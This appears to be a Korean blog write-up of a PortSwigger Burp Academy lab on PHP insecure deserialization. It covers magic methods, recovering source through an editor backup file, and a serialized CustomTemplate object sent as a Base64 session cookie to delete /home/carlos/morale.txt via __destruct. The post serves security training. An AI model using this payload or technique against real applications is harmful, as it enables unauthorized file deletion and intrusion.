---
layout: post
title: "Burp Academy-안전하지 않은 역직렬화(Insecure Deserialization) 관련 취약점: Arbitrary object injection in PHP"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Insecure Deserialization]
toc: true
last_modified_at: 2024-11-22 21:00:00 +0900
---


# 개요
- 안전하지 않은 역직렬화(Insecure Deserialization) 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php
- 취약점 설명페이지: https://portswigger.net/web-security/deserialization/exploiting
- 난이도: PRACTITIONER (보통)

# 취약점 개요
## 매직 메서드(Magic Method)
역직렬화 과정에서 자동으로 호출되는 메서드도 있다. 이 것을 `Magic method`라고 부른다. 매직 메서드는 객체지향 프로그래밍 언어에서는 흔한 기능이다. 예를들면 생성자가 매직 메서드의 하나이다. PHP에서 `__construct()` 함수는 오브젝트가 초기화될 때 자동으로 호출된다. 파이썬의 `__init()__`도 비슷한다. 매직메서드는 널리 사용되고 있고 그 자체로는 취약점이라고 볼 수 없다. 그러나 공격자로부터의 코드를 직접 실행시킬 수 있는 경우 취약점이 된다. (예를들어 역직렬화 오브젝트로부터) 
이 문맥에서 가장 중요한 것은, 어떤 언어는 **역직렬화 과정에서 자동으로 호출되는 메서드를 가지고 있다**는 점이다. 예를 들어 PHP의 `unserialize()`함수는 오브젝트의 `__wakeup()`함수를 찾고 실행시킨다. 

자바에서는 `ObjectInputStream.readObject()`가 그 역할을 한다. 바이트스트림으로부터 데이터를 읽어서 직렬화된 오브젝트를 재구성하는 생성자(constructor)같은 역할을 한다. 그리고 `Serializable`인터페이스를 구현한 클래스는 자신의 `readObject`를 선언 및 구현할 수 있다. 

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```

이렇게 선언된 readObject메서드는 역직렬화 중에 호출되는 매직 메서드 역할을 한다. 이를 통해 클래스는 자체 필드의 역직렬화를 더 세밀히 제어할 수 있다. 이러한 유형의 매직 메서드가 포함된 클래스에는 세심한 주의를 기울여야 한다. 이 메커니즘은 객체가 완전히 역직렬화되기 전에 직렬화된 개체의 데이터를 웹 사이트의 코드로 전달할 수 있게 한다. 이는 더 나아간 exploit을 개발하는 시작시점이 된다. 

## 임의의 오브젝트를 삽입하기(Injecting arbitrary objects)
- 지금까지는 웹 사이트에서 제공하는 객체를 간단히 편집하여 안전하지 않은 역직렬화를 악용하는 것을 공부했다. 
- 그러나 임의의 객체 유형을 주입하면 더 많은 가능성이 열릴 수 있다. 
- 객체 지향 프로그래밍에서 객체에 사용할 수 있는 메서드는 클래스에 따라 결정된다.
- 따라서 공격자가 직렬화된 데이터로 전달되는 개체 클래스를 조작할 수 있는 경우 역직렬화 이후는 물론 역직렬화 중에도 실행되는 코드에 영향을 미칠 수 있다. 
- 역직렬화 메서드는 종종 역직렬화 내용을 체크하지 않는다. 이는 웹 사이트에서 사용할 수 있는 직렬화 가능 클래스의 개체를 전달할 수 있으며 개체가 역직렬화된다는 의미다.  
- 이는 공격자가 웹 사이트에 임의의 클래스를 생성할 수 있다는 말이 된다. 
- 공격자가 소스 코드에 액세스할 수 있으면 사용 가능한 모든 클래스를 자세히 연구할 수 있다. (오픈소스)
- 공격자는 익스플로잇을 구성하기 위해 역직렬화 매직 메서드가 포함된 클래스를 찾은 다음, 제어 가능한 데이터에 대해 위험한 작업을 수행하는 클래스가 있는지 확인한다. 
- 이러한 역직렬화 매직 메서드가 포함된 클래스는 "Gadget chain"이라고 알려진 긴 일련의 메서드 호출과 관련된 보다 복잡한 공격을 시작하는 데에도 사용할 수 있다. 

# 문제 개요
- 이 랩은 직렬화 베이스의 세션 관리 메커니즘을 사용하고 있고, 임의의 오브젝트 인젝션이 가능하다. 
- 랩을 풀려면 악의적인 직렬화 오브젝트를 만들어서, Carlos유저의 홈 디렉토리에서 Morale.txt파일을 삭제한다. 
- 웹 사이트의 소스코드에 접근할 수 있다. 
- wiener:peter 크레덴셜로 로그인할 수 있다. 
- 힌트: 파일명뒤에 ~를 붙이면 에디터가 생성한 백업파일에 접근할 수 있다. 이를 통해 소스 코드를 확인할 수 있다. 

```
This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter

Hint
You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.
```

# 도전
이 랩에서는 임의의 오브젝트 인젝션 테크닉을 배울 수 있다. 

1. 일단 소스코드를 확인하는 방법을 확인할 필요가 있다. 랩을 살펴본다. 

my-account?id=wiener 엔드포인트의 웹 페이지를 보면 다음과 같은 주석이 포함되어 있는 것을 볼 수 있다. 힌트로 추정된다. 

```html
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```


2. `/libs/CustomTemplate.php`로 접근하면 200응답이 돌아온다. 내용은 없다. 

![](/images/burp-academy-serial-4-1.png)

`/libs/CustomTemplate.php~` 로 접근하자 다음과 같이 소스코드를 확인할 수 있었다! 

![](/images/burp-academy-serial-4-2.png)

3. 소스코드를 살펴본다. 
- CustomTemplate라는 이름의 클래스가 선언되어 있다. 
- 클래스가 삭제될 때 (__destruct가 호출될 때), 이 클래스의 멤버변수로 선언되어 있는 lock_file_path이 가리키는 곳에 파일이 존재하면 unlink함수가 호출되어 파일이 삭제되게 되어 있다. (매직메서드다)
- 따라서, 삭제하고자하는 경로 `/home/carlos/morale.txt`를 lock_file_path로 지정한 CustomTemplate클래스의 오브젝트를 생성해서 삽입하면 될 것 같다. 

```php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

```

4. PHP에서 오브젝트는 텍스트를 편집해서 만들 수 있다. 다음과 같다. 
- `CustomTemplate` 이라는 이름의 오브젝트, 1개의 속성을 지정한다. 
- 속성이름은 14글자의 `lock_file_path`고, 값은 23글자의 `/home/carlos/morale.txt`이다.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

이 것을 Base64 인코딩하면 `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==`가 된다. 

5. 이 페이로드를 session 쿠키에 설정한다. 그렇다. 세션쿠기가 오브젝트를 인젝션할 수 있는 입구인 것인다. 요청을 보내보면 500응답이 돌아온다. 

![](/images/burp-academy-serial-4-3.png)

6. 하지만 파일삭제에 성공해 문제가 풀렸다는 메세지가 출력된다. 

![](/images/burp-academy-serial-4-success.png)
